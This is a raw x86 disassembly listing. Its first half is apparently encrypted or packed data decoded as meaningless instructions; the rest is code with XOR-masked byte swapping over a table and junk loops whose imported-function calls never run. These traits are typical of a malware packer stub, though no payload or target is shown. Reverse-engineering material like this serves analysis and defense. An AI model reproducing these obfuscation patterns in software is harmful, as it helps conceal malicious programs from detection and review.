  42cec2:	cmc    
  42cec3:	ror    edx,0xe5
  42cec6:	clc    
  42cec7:	iret   
  42cec8:	out    0xd0,al
  42ceca:	enter  0xcad6,0xf7
  42cece:	mov    esp,0xd3dcf9ba
  42ced3:	cli    
  42ced4:	repnz (bad) 
  42ced6:	fndisi(8087 only) 
  42ced8:	in     al,0xd5
  42ceda:	cmc    
  42cedb:	into   
  42cedc:	add    bh,ah
  42cede:	loope  0x42cec1
  42cee0:	loope  0x42cec2
  42cee2:	leave  
  42cee3:	shl    eax,1
  42cee5:	ret    0xf3e0
  42cee8:	enter  0xeeff,0x3
  42ceec:	retf   0xbbf0
  42ceef:	fabs   
  42cef1:	add    al,al
  42cef3:	cli    
  42cef4:	out    0xea,eax
  42cef6:	sti    
  42cef7:	call   0xc923c5e1
  42cefc:	out    dx,eax
  42cefd:	faddp  st(6),st
  42ceff:	mov    edi,0xe0b1e4c9
  42cf04:	icebp  
  42cf05:	rcl    cl,cl
  42cf07:	imul   DWORD PTR [ebp-0x16212108]
  42cf0d:	cld    
  42cf0e:	add    bl,dl
  42cf10:	mov    ch,0xbf
  42cf12:	xlat   BYTE PTR ds:[ebx]
  42cf13:	mov    esp,0xae7c6eb
  42cf18:	jmp    0x42cf04
  42cf1a:	into   
  42cf1b:	out    0xf8,eax
  42cf1d:	fnsave [ecx-0x1c1e4d18]
  42cf23:	lods   eax,DWORD PTR ds:[esi]
  42cf24:	jmp    0xb9f6:0xc7f5afe7
  42cf2b:	(bad)  
  42cf2c:	lock add al,BYTE PTR [ecx]
  42cf2f:	mov    ecx,0xd3d9d5ce
  42cf34:	inc    bl
  42cf36:	(bad)  
  42cf37:	inc    ah
  42cf39:	in     eax,dx
  42cf3a:	loope  0x42cf16
  42cf3c:	shr    edi,0xc3
  42cf3f:	into   
  42cf40:	retf   
  42cf41:	mov    esi,0xe5d0e1ee
  42cf46:	(bad)  
  42cf47:	out    dx,eax
  42cf48:	mov    ah,0xfd
  42cf4a:	std    
  42cf4b:	fild   DWORD PTR [ebx]
  42cf4d:	int    0xde
  42cf4f:	ret    0xc7be
  42cf52:	cmc    
  42cf53:	ret    
  42cf54:	add    BYTE PTR [eax],al
  42cf56:	add    ah,bl
  42cf58:	or     ah,bh
  42cf5a:	aam    0xd9
  42cf5c:	fimul  DWORD PTR [edi]
  42cf5e:	in     al,dx
  42cf5f:	mov    ebx,0xd4cfb1ee
  42cf65:	jmp    0xe6f7be5b
  42cf6a:	(bad)  
  42cf6c:	fsubp  st(4),st
  42cf6e:	into   
  42cf6f:	lock repnz rol eax,cl
  42cf73:	in     al,0xfe
  42cf75:	(bad)  
  42cf76:	cld    
  42cf77:	or     ecx,DWORD PTR [eax]
  42cf79:	loop   0x42cf4f
  42cf7b:	in     eax,0xf9
  42cf7d:	adc    ecx,ecx
  42cf7f:	shl    al,1
  42cf81:	cmc    
  42cf82:	(bad)
  42cf86:	loopne 0x42cf52
  42cf88:	repz stc 
  42cf8a:	into   
  42cf8b:	(bad)  
  42cf8c:	(bad)  
  42cf8d:	in     al,dx
  42cf8e:	(bad)  
  42cf8f:	fadd   st,st(1)
  42cf91:	rol    DWORD PTR [eax],cl
  42cf93:	mov    ebp,0xc4e802c5
  42cf98:	push   cs
  42cf99:	(bad)  
  42cf9b:	fild   WORD PTR [edi]
  42cf9d:	or     esp,eax
  42cf9f:	mul    esi
  42cfa1:	jmp    0x42cf80
  42cfa3:	jmp    0x42cf5a
  42cfa5:	in     eax,dx
  42cfa6:	fmul   st,st(6)
  42cfa8:	imul   eax
  42cfaa:	(bad)
  42cfad:	mov    eax,0xbdd9dfbe
  42cfb2:	loopne 0x42cfa5
  42cfb4:	mov    esp,0xc5e001c7
  42cfb9:	jecxz  0x42cfbe
  42cfbb:	out    0xd8,eax
  42cfbd:	stc    
  42cfbe:	into   
  42cfbf:	scas   al,BYTE PTR es:[edi]
  42cfc0:	test   eax,0xf2b7cdf0
  42cfc5:	mov    edx,0xfdf2f0b0
  42cfca:	iret   
  42cfcb:	mov    ecx,0xd8e2c8d6
  42cfd0:	not    ebp
  42cfd2:	aad    0xf0
  42cfd4:	mov    esp,0xeed8d9bc
  42cfd9:	out    0xde,eax
  42cfdb:	in     al,0x6
  42cfdd:	leave  
  42cfde:	mov    eax,0xabc3cfe9
  42cfe3:	lock into 
  42cfe5:	(bad)  
  42cfe6:	mov    ah,0xf2
  42cfe8:	aad    0xd7
  42cfea:	neg    ecx
  42cfec:	sar    DWORD PTR [ebx-0x9052d29],1
  42cff2:	stc    
  42cff3:	or     edi,eax
  42cff5:	loope  0x42cfd9
  42cff7:	shr    edx,0xcf
  42cffa:	or     al,bh
  42cffc:	fild   DWORD PTR [ecx+edi*4]
  42cfff:	out    0xdc,eax
  42d001:	cmc    
  42d002:	mov    bl,0xcc
  42d004:	mov    al,0xcb
  42d006:	sar    dl,cl
  42d008:	in     al,dx
  42d009:	iret   
  42d00a:	lock mov esi,0xbabcdacd
  42d010:	in     eax,dx
  42d011:	mov    edi,0xc3f2bd01
  42d016:	xlat   BYTE PTR ds:[ebx]
  42d017:	add    eax,DWORD PTR [esi]
  42d019:	push   es
  42d01a:	in     al,dx
  42d01b:	ret    0xfe0a
  42d01e:	fld    st(1)
  42d020:	into   
  42d021:	out    dx,eax
  42d022:	ret    0xe7dc
  42d025:	mov    ebx,0xb9cdb8b0
  42d02a:	mov    edx,0xb7fdd1bd
  42d02f:	loope  0x42d026
  42d031:	cli    
  42d032:	int3   
  42d033:	(bad)  
  42d034:	sti    
  42d035:	fild   DWORD PTR [ecx+eax*1]
  42d038:	add    ch,ch
  42d03a:	add    ebp,ebp
  42d03c:	jmp    0xe5c6:0xf1bed20c
  42d043:	aam    0xda
  42d045:	out    dx,al
  42d046:	mov    bl,0xc5
  42d048:	mov    eax,0xdccdfac8
  42d04d:	cmc    
  42d04e:	call   0xe40fa612
  42d053:	cli    
  42d054:	(bad)
  42d057:	shr    bl,0xe7
  42d05a:	aad    0xd
  42d05c:	jmp    0xce349e60
  42d061:	icebp  
  42d062:	mov    ch,0xf5
  42d064:	aam    0xe0
  42d066:	into   
  42d067:	in     eax,0xeb
  42d069:	out    0xe9,al
  42d06b:	mov    esp,0xe0debeec
  42d070:	lock shl dh,1
  42d073:	in     al,0xdb
  42d075:	add    al,BYTE PTR [ecx]
  42d077:	leave  
  42d078:	ror    BYTE PTR [esi],0xc4
  42d07b:	std    
  42d07c:	or     ah,ch
  42d07e:	in     al,0xe9
  42d080:	mov    ebp,0xd2cac5e4
  42d085:	icebp  
  42d086:	retf   
  42d087:	jmp    0xd02fae63
  42d08c:	rcr    edx,cl
  42d08e:	aad    0xdc
  42d090:	(bad)  
  42d091:	lock fadd QWORD PTR [esi]
  42d094:	in     eax,0x3
  42d096:	out    0xd0,eax
  42d098:	in     eax,0xe3
  42d09a:	enter  0x1ff,0xc0
  42d09e:	shl    BYTE PTR [ebx-0x394d3d53],cl
  42d0a4:	(bad)
  42d0a7:	loopne 0x42d091
  42d0a9:	ftst   
  42d0ab:	fsin   
  42d0ad:	mov    edi,0x1f7bc01
  42d0b2:	mov    edi,0x2d2d805
  42d0b7:	inc    ebp
  42d0b9:	retf   
  42d0ba:	or     bl,al
  42d0bc:	add    eax,0xc5c1e412
  42d0c1:	(bad)
  42d0c4:	out    0xe1,eax
  42d0c6:	ror    edx,cl
  42d0c8:	(bad)  
  42d0c9:	(bad)  
  42d0cb:	mov    esp,0xf7d6de03
  42d0d0:	mov    ch,0x1
  42d0d2:	(bad)  
  42d0d4:	add    eax,0xf9c7ddc3
  42d0d9:	out    dx,eax
  42d0da:	retf   0xcfd
  42d0dd:	jmp    0xa9298ecd
  42d0e2:	shl    DWORD PTR [edi-0x264a0c2f],1
  42d0e8:	fidivr WORD PTR [ebx-0x4f35342b]
  42d0ee:	add    DWORD PTR [esi-0x1a2d2540],esi
  42d0f4:	in     eax,0xf2
  42d0f6:	icebp  
  42d0f7:	add    ch,bh
  42d0f9:	fst    st(4)
  42d0fb:	leave  
  42d0fc:	fld    QWORD PTR [eax+esi*8]
  42d0ff:	(bad)  
  42d100:	fmulp  st(7),st
  42d102:	leave  
  42d103:	mov    esp,0xd5d6ebe6
  42d108:	xlat   BYTE PTR ds:[ebx]
  42d109:	(bad)  
  42d10b:	mov    esp,0xdcd4d0de
  42d110:	out    dx,al
  42d111:	sti    
  42d112:	(bad)  
  42d113:	inc    DWORD PTR [esi]
  42d115:	add    edi,ecx
  42d117:	les    ecx,FWORD PTR [edx]
  42d119:	jmp    0x626b919
  42d11e:	in     eax,dx
  42d11f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d120:	icebp  
  42d121:	loopne 0x42d0ff
  42d123:	cmc    
  42d124:	jmp    0xca35961f
  42d129:	in     al,dx
  42d12a:	aam    0xbd
  42d12c:	mov    esi,0xfcc8cffa
  42d131:	mov    esi,0xe1c7c6e0
  42d137:	hlt    
  42d138:	hlt    
  42d139:	loope  0x42d118
  42d13b:	fisttp QWORD PTR ds:0xaebcc503
  42d141:	ret    
  42d142:	hlt    
  42d143:	enter  0xefb2,0xf1
  42d147:	idiv   ebx
  42d149:	fdivr  st,st(5)
  42d14b:	neg    eax
  42d14d:	cli    
  42d14e:	loopne 0x42d137
  42d150:	repnz int 0xf6
  42d153:	(bad)  
  42d154:	stc    
  42d155:	std    
  42d156:	fucom  st(7)
  42d158:	mul    dh
  42d15a:	(bad)
  42d15d:	add    edi,DWORD PTR [esi-0x18312e50]
  42d163:	mov    dl,0xd5
  42d165:	mov    bl,0xd7
  42d167:	in     al,0xfe
  42d169:	(bad)  
  42d16a:	mov    bl,0xdb
  42d16c:	(bad)  
  42d16e:	mov    edi,0xf400d1ed
  42d173:	ret    
  42d174:	ror    edx,0xd9
  42d177:	fild   DWORD PTR [esi]
  42d179:	push   es
  42d17a:	(bad)  
  42d17b:	or     BYTE PTR [esi],cl
  42d17d:	shr    dh,cl
  42d17f:	scas   eax,DWORD PTR es:[edi]
  42d180:	out    0xf0,al
  42d182:	lods   eax,DWORD PTR ds:[esi]
  42d183:	in     eax,0xf4
  42d185:	div    edx
  42d187:	clc    
  42d188:	fincstp 
  42d18a:	cmc    
  42d18b:	leave  
  42d18c:	sti    
  42d18d:	mov    ah,0xce
  42d18f:	loope  0x42d18e
  42d191:	cmc    
  42d192:	add    al,bl
  42d194:	add    eax,eax
  42d196:	add    eax,0xe0fcfe
  42d19b:	(bad)  
  42d19d:	out    0xc6,eax
  42d19f:	into   
  42d1a0:	out    dx,eax
  42d1a1:	out    dx,eax
  42d1a2:	scas   eax,DWORD PTR es:[edi]
  42d1a3:	shr    bh,1
  42d1a5:	out    dx,al
  42d1a6:	mov    cl,0xb8
  42d1a8:	fldl2e 
  42d1aa:	stc    
  42d1ab:	lock lock jmp 0xc33ec883
  42d1b2:	jecxz  0x42d1a6
  42d1b4:	(bad)  
  42d1b6:	(bad)  
  42d1b7:	enter  0xfbe5,0x6
  42d1bb:	cld    
  42d1bc:	repz add eax,0xafeda9ae
  42d1c2:	mov    cl,0xfb
  42d1c4:	mov    bh,0xe7
  42d1c6:	rcr    eax,0xca
  42d1c9:	std    
  42d1ca:	mov    ah,0xfd
  42d1cc:	in     al,dx
  42d1cd:	repz loop 0x42d1c7
  42d1d0:	add    bh,bl
  42d1d2:	(bad)  
  42d1d4:	retf   
  42d1d5:	mov    eax,0xe4dedf09
  42d1da:	aad    0x13
  42d1dc:	cld    
  42d1dd:	out    dx,eax
  42d1de:	(bad)  
  42d1df:	jmp    0xb13a7ac9
  42d1e4:	lock cli 
  42d1e6:	loope  0x42d1b0
  42d1e8:	iret   
  42d1e9:	into   
  42d1ea:	mov    edi,0xecd1eaba
  42d1ef:	inc    dl
  42d1f1:	in     al,dx
  42d1f2:	test   DWORD PTR [ebx],0xc6c9f0d7
  42d1f8:	aam    0xfd
  42d1fa:	fld1   
  42d1fc:	(bad)  
  42d1ff:	retf   
  42d200:	mov    al,0xe7
  42d202:	lods   al,BYTE PTR ds:[esi]
  42d203:	aam    0xc1
  42d205:	in     eax,dx
  42d206:	mov    cl,0xd9
  42d208:	fidiv  WORD PTR [eax+esi*8-0x1c46090a]
  42d20f:	int3   
  42d210:	(bad)  
  42d212:	idiv   bh
  42d214:	(bad)  
  42d215:	rol    dh,cl
  42d217:	ret    0x1c0
  42d21a:	fcmovu st,st(6)
  42d21c:	fninit 
  42d21e:	lods   al,BYTE PTR ds:[esi]
  42d21f:	call   0xb304b7d6
  42d224:	mov    esi,0xddeecaf1
  42d22a:	int    0xe4
  42d22c:	cld    
  42d22d:	clc    
  42d22e:	in     eax,dx
  42d22f:	loop   0x42d232
  42d231:	hlt    
  42d232:	add    eax,0xf100f1df
  42d237:	fcmovne st,st(1)
  42d239:	fsubr  st,st(3)
  42d23b:	cld    
  42d23c:	clc    
  42d23d:	in     eax,0xec
  42d23f:	int    0xaf
  42d241:	lods   eax,DWORD PTR ds:[esi]
  42d242:	mov    ebp,0xfaf6e9d7
  42d247:	inc    esi
  42d249:	neg    ebx
  42d24b:	in     eax,dx
  42d24c:	(bad)  
  42d24d:	out    dx,eax
  42d24e:	loope  0x42d257
  42d250:	(bad)  
  42d252:	add    al,0xc3
  42d254:	clc    
  42d255:	sti    
  42d256:	xlat   BYTE PTR ds:[ebx]
  42d257:	add    dl,ch
  42d259:	fdiv   st,st(4)
  42d25b:	adc    ebx,esp
  42d25d:	push   es
  42d25e:	(bad)
  42d261:	scas   eax,DWORD PTR es:[edi]
  42d262:	into   
  42d263:	scas   al,BYTE PTR es:[edi]
  42d264:	out    0xd5,eax
  42d266:	cmc    
  42d267:	mov    dl,0xdb
  42d269:	lock fcomp st(4)
  42d26c:	in     al,dx
  42d26d:	(bad)  
  42d26f:	in     al,dx
  42d270:	aam    0x6
  42d272:	std    
  42d273:	fild   WORD PTR [eax]
  42d275:	jecxz  0x42d24d
  42d277:	aam    0xbd
  42d279:	fimul  DWORD PTR [ebx]
  42d27b:	out    0xed,al
  42d27d:	jecxz  0x42d25b
  42d27f:	jmp    0xb823a335
  42d284:	(bad)
  42d287:	retf   0xccb4
  42d28a:	sar    cl,1
  42d28c:	icebp  
  42d28d:	lock cli 
  42d28f:	in     al,dx
  42d290:	div    ch
  42d292:	fcmovb st,st(2)
  42d294:	add    al,bh
  42d296:	hlt    
  42d297:	(bad)  
  42d299:	or     eax,0xf2e5edc5
  42d29e:	test   eax,0xdcacd3ee
  42d2a3:	div    BYTE PTR [eax-0x2032461c]
  42d2a9:	sti    
  42d2aa:	in     al,0xf4
  42d2ac:	xlat   BYTE PTR ds:[ebx]
  42d2ad:	jmp    0xdf01:0xe3fef8c1
  42d2b4:	fld    DWORD PTR [eax]
  42d2b6:	stc    
  42d2b7:	lock in al,0xf4
  42d2ba:	add    DWORD PTR [ebx+eiz*8],ecx
  42d2bd:	or     ch,al
  42d2bf:	iret   
  42d2c0:	div    ecx
  42d2c2:	into   
  42d2c3:	loopne 0x42d275
  42d2c5:	shl    DWORD PTR [ebx-0x484b4b0e],cl
  42d2cb:	icebp  
  42d2cc:	enter  0xc1f0,0xe0
  42d2d0:	ret    
  42d2d1:	ret    0xf104
  42d2d4:	out    0xfa,eax
  42d2d6:	rol    DWORD PTR [edi*8-0x341e1023],0xd9
  42d2de:	mov    eax,0xecc3edea
  42d2e3:	aad    0xd7
  42d2e5:	jmp    0xb2d7:0xeee9f1f4
  42d2ec:	std    
  42d2ed:	retf   0xf0fb
  42d2f0:	rol    bh,0xd8
  42d2f3:	add    eax,DWORD PTR [edi]
  42d2f5:	jmp    0xfd24a7eb
  42d2fa:	loop   0x42d2dc
  42d2fc:	(bad)  
  42d2fe:	shl    bl,cl
  42d300:	mov    al,0xf2
  42d302:	shl    ch,1
  42d304:	(bad)  
  42d306:	mov    ch,0xb4
  42d308:	mov    ecx,0xcbf3fcb6
  42d30d:	fcomp  st(2)
  42d30f:	ret    
  42d310:	in     eax,dx
  42d311:	rcr    esi,cl
  42d313:	repnz or ebx,esp
  42d316:	(bad)  
  42d318:	(bad)  
  42d31a:	push   es
  42d31b:	pop    es
  42d31c:	retf   0xe5f3
  42d31f:	(bad)  
  42d320:	fadd   st(3),st
  42d322:	loopne 0x42d2d2
  42d324:	sti    
  42d325:	mov    bl,0xe1
  42d327:	fcmovnbe st,st(3)
  42d329:	leave  
  42d32a:	out    dx,eax
  42d32b:	cld    
  42d32c:	(bad)  
  42d32e:	(bad)  
  42d32f:	add    edx,esp
  42d331:	loopne 0x42d32f
  42d333:	mov    BYTE PTR ds:0xeaeaca0b,0xeb
  42d33a:	loop   0x42d341
  42d33c:	jmp    0x42d33b
  42d33e:	mov    edi,0xb2c8c7ca
  42d343:	call   0xdc0e8a2a
  42d348:	enter  0xbef5,0xb9
  42d34c:	jmp    0xfb26c01a
  42d351:	shl    ecx,1
  42d353:	add    eax,0xdd09e5d0
  42d358:	call   0xed4add1d
  42d35d:	loop   0x42d30a
  42d35f:	fidiv  WORD PTR [ebx-0x4c180a3f]
  42d365:	out    dx,al
  42d366:	stc    
  42d367:	clc    
  42d368:	retf   
  42d369:	jmp    0xe9148c33
  42d36e:	aad    0xe1
  42d370:	out    0xdc,al
  42d372:	repz rcr bl,1
  42d375:	loope  0x42d37e
  42d377:	(bad)  
  42d379:	loope  0x42d389
  42d37b:	add    cl,ch
  42d37d:	out    0xed,eax
  42d37f:	into   
  42d380:	jmp    0x42d34f
  42d382:	scas   al,BYTE PTR es:[edi]
  42d383:	loop   0x42d36c
  42d385:	loopne 0x42d33b
  42d387:	mov    edx,0xb2f4c4c6
  42d38c:	aam    0xc2
  42d38e:	mov    eax,0xf9faf200
  42d393:	dec    bl
  42d395:	mov    esp,0xeef8d5f9
  42d39a:	or     edi,eax
  42d39c:	(bad)  
  42d39d:	rol    esp,cl
  42d39f:	jecxz  0x42d358
  42d3a1:	mov    cl,0xad
  42d3a3:	lock fidiv DWORD PTR [ecx+esi*8-0x229310b]
  42d3ab:	enter  0xf9db,0xc1
  42d3af:	xlat   BYTE PTR ds:[ebx]
  42d3b0:	rcl    ah,cl
  42d3b2:	hlt    
  42d3b3:	sti    
  42d3b4:	fsubr  st,st(3)
  42d3b6:	stc    
  42d3b7:	hlt    
  42d3b8:	out    0xc9,eax
  42d3ba:	loopne 0x42d3bc
  42d3bc:	or     BYTE PTR [edx],cl
  42d3be:	lods   eax,DWORD PTR ds:[esi]
  42d3bf:	test   al,0xf7
  42d3c1:	fdiv   QWORD PTR [edi-0x19484c3f]
  42d3c7:	mov    eax,0xf9ffbac7
  42d3cc:	retf   
  42d3cd:	mov    edx,0xd9f800d9
  42d3d2:	loop   0x42d3da
  42d3d4:	mov    ecx,0xef5fff6
  42d3d9:	fcom   st(5)
  42d3db:	cli    
  42d3dc:	in     eax,dx
  42d3dd:	jmp    0xecd1:0xf6f2ade9
  42d3e4:	(bad)  
  42d3e5:	loopne 0x42d3db
  42d3e7:	stc    
  42d3e8:	repnz out 0xd6,al
  42d3eb:	out    dx,eax
  42d3ec:	(bad)  
  42d3ee:	cld    
  42d3ef:	loopne 0x42d3d8
  42d3f1:	mov    ecx,DWORD PTR [ebp-0x8]
  42d3f4:	mov    al,BYTE PTR [ecx+eax*1+0x3272fb]
  42d3fb:	mov    BYTE PTR [ebp-0x25],al
  42d3fe:	mov    eax,DWORD PTR [ebp+0xc]
  42d401:	xor    eax,0x75108b5
  42d406:	mov    ecx,DWORD PTR [ebp+0x8]
  42d409:	xor    ecx,0x75108b5
  42d40f:	mov    edx,DWORD PTR [ebp-0x8]
  42d412:	mov    esi,DWORD PTR [ebp-0x8]
  42d415:	mov    al,BYTE PTR [esi+eax*1+0x3272fb]
  42d41c:	mov    BYTE PTR [edx+ecx*1+0x3272fb],al
  42d423:	mov    eax,DWORD PTR [ebp+0xc]
  42d426:	xor    eax,0x75108b5
  42d42b:	mov    ecx,DWORD PTR [ebp-0x8]
  42d42e:	mov    dl,BYTE PTR [ebp-0x25]
  42d431:	mov    BYTE PTR [ecx+eax*1+0x3272fb],dl
  42d438:	mov    eax,DWORD PTR [ebp+0xc]
  42d43b:	xor    eax,0x75108b5
  42d440:	add    eax,0x3272fb
  42d445:	pop    esi
  42d446:	leave  
  42d447:	ret    0x10
  42d44a:	push   ebp
  42d44b:	mov    ebp,esp
  42d44d:	sub    esp,0xa0
  42d453:	mov    eax,ds:0x43739f
  42d458:	adc    ecx,DWORD PTR ds:0x43775b
  42d45e:	mov    DWORD PTR [ebp-0x2c],eax
  42d461:	lea    eax,[ebp-0x3c]
  42d464:	mov    DWORD PTR [ebp-0x28],eax
  42d467:	mov    DWORD PTR ds:0x437763,0x13
  42d471:	cmp    DWORD PTR ds:0x437763,0x0
  42d478:	je     0x42d4c5
  42d47e:	cmp    DWORD PTR ds:0x437763,0x5
  42d485:	jle    0x42d4c5
  42d48b:	jmp    0x42d499
  42d490:	push   DWORD PTR [ebp-0x1c]
  42d493:	call   DWORD PTR ds:0x43c998
  42d499:	cmp    DWORD PTR ds:0x437763,0x6
  42d4a0:	jne    0x42d4b3
  42d4a6:	mov    ecx,DWORD PTR ds:0x437763
  42d4ac:	dec    ecx
  42d4ad:	mov    DWORD PTR ds:0x437763,ecx
  42d4b3:	mov    ecx,DWORD PTR ds:0x437763
  42d4b9:	dec    ecx
  42d4ba:	mov    DWORD PTR ds:0x437763,ecx
  42d4c0:	jmp    0x42d471
  42d4c5:	mov    eax,DWORD PTR [ebp-0x28]
  42d4c8:	and    DWORD PTR ds:0x437713,0x0
  42d4d2:	xor    ecx,ecx
  42d4d4:	add    ecx,DWORD PTR ds:0x437713
  42d4da:	inc    ecx
  42d4db:	mov    DWORD PTR ds:0x437713,ecx
  42d4e1:	cmp    DWORD PTR ds:0x437713,0x2a
  42d4e8:	jl     0x42d514
  42d4ee:	jmp    0x42d507
  42d4f3:	push   DWORD PTR [ebp-0x1c]
  42d4f6:	push   DWORD PTR [ebp-0x20]
  42d4f9:	push   0x43779f
  42d4fe:	push   DWORD PTR [ebp-0x24]
  42d501:	call   DWORD PTR ds:0x43c99c
  42d507:	cmp    DWORD PTR ds:0x437713,0x1e
  42d50e:	jb     0x42d4d2
  42d514:	mov    ecx,DWORD PTR ds:0x4374bf
  42d51a:	adc    DWORD PTR ds:0x437727,0x6e64
  42d524:	mov    DWORD PTR [eax],ecx
  42d526:	adc    ecx,DWORD PTR ds:0x43772f
  42d52c:	mov    DWORD PTR [ebp-0x38],0xf89c85b0
  42d533:	adc    DWORD PTR ds:0x437733,ebx
  42d539:	mov    DWORD PTR [ebp-0x90],0xf89c85b3
  42d543:	xor    eax,eax
  42d545:	lea    eax,[ebp-0x4]
  42d548:	adc    DWORD PTR ds:0x43777f,0x7eae
  42d552:	mov    DWORD PTR [ebp-0x18],eax
  42d555:	mov    eax,DWORD PTR [ebp-0x18]
  42d558:	or     ecx,DWORD PTR ds:0x437727
  42d55e:	mov    eax,DWORD PTR [eax]
  42d560:	xor    ecx,ecx
  42d562:	xor    ecx,DWORD PTR ds:0x4377cb
  42d568:	mov    ecx,DWORD PTR [ecx]
  42d56a:	add    DWORD PTR ds:0x43778f,ecx
  42d570:	mov    ecx,DWORD PTR [ebp-0x4]
  42d573:	sub    eax,ecx
  42d575:	mov    ecx,DWORD PTR [ebp-0x18]
  42d578:	mov    DWORD PTR ds:0x437717,0x6eff
  42d582:	mov    DWORD PTR [ecx],eax
  42d584:	xor    eax,DWORD PTR ds:0x43771f
  42d58a:	mov    eax,DWORD PTR [ebp-0x18]
  42d58d:	dec    DWORD PTR ds:0x437737
  42d593:	mov    eax,DWORD PTR [eax]
  42d595:	inc    ecx
  42d596:	xor    eax,0xf89cb5b0
  42d59b:	mov    ecx,DWORD PTR [ebp-0x18]
  42d59e:	adc    DWORD PTR ds:0x43772b,0x999
  42d5a8:	mov    DWORD PTR [ecx],eax
  42d5aa:	mov    DWORD PTR ds:0x437753,0x18
  42d5b4:	cmp    DWORD PTR ds:0x437753,0x0
  42d5bb:	je     0x42d600
  42d5c1:	cmp    DWORD PTR ds:0x437753,0x21
  42d5c8:	jb     0x42d600
  42d5ce:	jmp    0x42d5ec
  42d5d3:	push   0x76ac
  42d5d8:	push   0x2657
  42d5dd:	push   DWORD PTR [ebp-0x14]
  42d5e0:	push   DWORD PTR [ebp-0x28]
  42d5e3:	push   DWORD PTR [ebp-0x24]
  42d5e6:	call   DWORD PTR ds:0x43c9a0
  42d5ec:	xor    ecx,ecx
  42d5ee:	or     ecx,DWORD PTR ds:0x437753
  42d5f4:	dec    ecx
  42d5f5:	mov    DWORD PTR ds:0x437753,ecx
  42d5fb:	jmp    0x42d5b4
  42d600:	lea    eax,[ebp-0x8]
  42d603:	mov    DWORD PTR ds:0x437787,0x1b
  42d60d:	cmp    DWORD PTR ds:0x437787,0x0
  42d614:	je     0x42d64e
  42d61a:	cmp    DWORD PTR ds:0x437787,0x23
  42d621:	jl     0x42d64e
  42d627:	jmp    0x42d63a
  42d62c:	push   0x8dd4
  42d631:	push   DWORD PTR [ebp-0x18]
  42d634:	call   DWORD PTR ds:0x43c9a4
  42d63a:	xor    ecx,ecx
  42d63c:	xor    ecx,DWORD PTR ds:0x437787
  42d642:	dec    ecx
  42d643:	mov    DWORD PTR ds:0x437787,ecx
  42d649:	jmp    0x42d60d
  42d64e:	mov    DWORD PTR [ebp-0x14],eax
  42d651:	not    eax
  42d653:	mov    eax,DWORD PTR [ebp-0x14]
  42d656:	xor    DWORD PTR ds:0x43774b,ecx
  42d65c:	mov    eax,DWORD PTR [eax]
  42d65e:	xor    DWORD PTR ds:0x43779b,edi
  42d664:	mov    ecx,DWORD PTR [ebp-0x8]
  42d667:	neg    DWORD PTR ds:0x4377b3
  42d66d:	sub    eax,ecx
  42d66f:	and    ecx,DWORD PTR ds:0x43775f
  42d675:	mov    ecx,DWORD PTR [ebp-0x14]
  42d678:	mov    DWORD PTR [ecx],eax
  42d67a:	adc    eax,DWORD PTR ds:0x43771b
  42d680:	mov    eax,DWORD PTR [ebp-0x14]
  42d683:	mov    DWORD PTR ds:0x437757,0x10
  42d68d:	cmp    DWORD PTR ds:0x437757,0x0
  42d694:	je     0x42d6d0
  42d69a:	cmp    DWORD PTR ds:0x437757,0x12
  42d6a1:	jge    0x42d6d0
  42d6a7:	jmp    0x42d6bc
  42d6ac:	push   0x155c
  42d6b1:	push   0x7a14
  42d6b6:	call   DWORD PTR ds:0x43c9a8
  42d6bc:	xor    ecx,ecx
  42d6be:	xor    ecx,DWORD PTR ds:0x437757
  42d6c4:	dec    ecx
  42d6c5:	mov    DWORD PTR ds:0x437757,ecx
  42d6cb:	jmp    0x42d68d
  42d6d0:	mov    eax,DWORD PTR [eax]
  42d6d2:	and    DWORD PTR ds:0x43775b,0x0
  42d6dc:	xor    ecx,ecx
  42d6de:	or     ecx,DWORD PTR ds:0x43775b
  42d6e4:	inc    ecx
  42d6e5:	mov    DWORD PTR ds:0x43775b,ecx
  42d6eb:	cmp    DWORD PTR ds:0x43775b,0x1e
  42d6f2:	jb     0x42d71a
  42d6f8:	jmp    0x42d70d
  42d6fd:	push   0x43775b
  42d702:	push   0x3fc2
  42d707:	call   DWORD PTR ds:0x43c9ac
  42d70d:	cmp    DWORD PTR ds:0x43775b,0x14
  42d714:	jb     0x42d6dc
  42d71a:	or     eax,0xf89f05b0
  42d71f:	and    DWORD PTR ds:0x437763,0x0
  42d729:	mov    ecx,DWORD PTR ds:0x437763
  42d72f:	inc    ecx
  42d730:	mov    DWORD PTR ds:0x437763,ecx
  42d736:	cmp    DWORD PTR ds:0x437763,0x1d
  42d73d:	jg     0x42d763
  42d743:	jmp    0x42d756
  42d748:	push   DWORD PTR [ebp-0x24]
  42d74b:	push   0x79a8
  42d750:	call   DWORD PTR ds:0x43c9b0
  42d756:	cmp    DWORD PTR ds:0x437763,0x12
  42d75d:	jb     0x42d729
  42d763:	mov    ecx,DWORD PTR [ebp-0x14]
  42d766:	adc    DWORD PTR ds:0x43778f,0x4377ab
  42d770:	mov    DWORD PTR [ecx],eax
  42d772:	sub    ecx,DWORD PTR ds:0x43779f
  42d778:	lea    eax,[ebp-0x10]
  42d77b:	mov    DWORD PTR [ebp-0x8c],eax
  42d781:	and    DWORD PTR ds:0x437743,0x0
  42d78b:	mov    eax,ds:0x437743
  42d790:	inc    eax
  42d791:	mov    ds:0x437743,eax
  42d796:	cmp    DWORD PTR ds:0x437743,0x24
  42d79d:	jbe    0x42d7ca
  42d7a3:	jmp    0x42d7bd
  42d7a8:	push   0x43778f
  42d7ad:	push   0x43778f
  42d7b2:	push   0x7a81
  42d7b7:	call   DWORD PTR ds:0x43c9b4
  42d7bd:	cmp    DWORD PTR ds:0x437743,0x18
  42d7c4:	jb     0x42d78b
  42d7ca:	mov    eax,DWORD PTR [ebp-0x8c]
  42d7d0:	sub    DWORD PTR ds:0x437777,ecx
  42d7d6:	mov    eax,DWORD PTR [eax]
  42d7d8:	neg    ecx
  42d7da:	mov    ecx,DWORD PTR [ebp-0x10]
  42d7dd:	sub    DWORD PTR ds:0x43772f,0x437757
  42d7e7:	sub    eax,ecx
  42d7e9:	mov    ecx,DWORD PTR [ebp-0x8c]
  42d7ef:	mov    DWORD PTR [ecx],eax
  42d7f1:	mov    eax,DWORD PTR [ebp-0x8c]
  42d7f7:	mov    eax,DWORD PTR [eax]
  42d7f9:	or     eax,0xf89c85f0
  42d7fe:	mov    ecx,DWORD PTR [ebp-0x8c]
  42d804:	mov    DWORD PTR [ecx],eax
  42d806:	lea    eax,[ebp-0x24]
  42d809:	mov    DWORD PTR [ebp-0x34],eax
  42d80c:	mov    eax,DWORD PTR [ebp-0x34]
  42d80f:	mov    eax,DWORD PTR [eax]
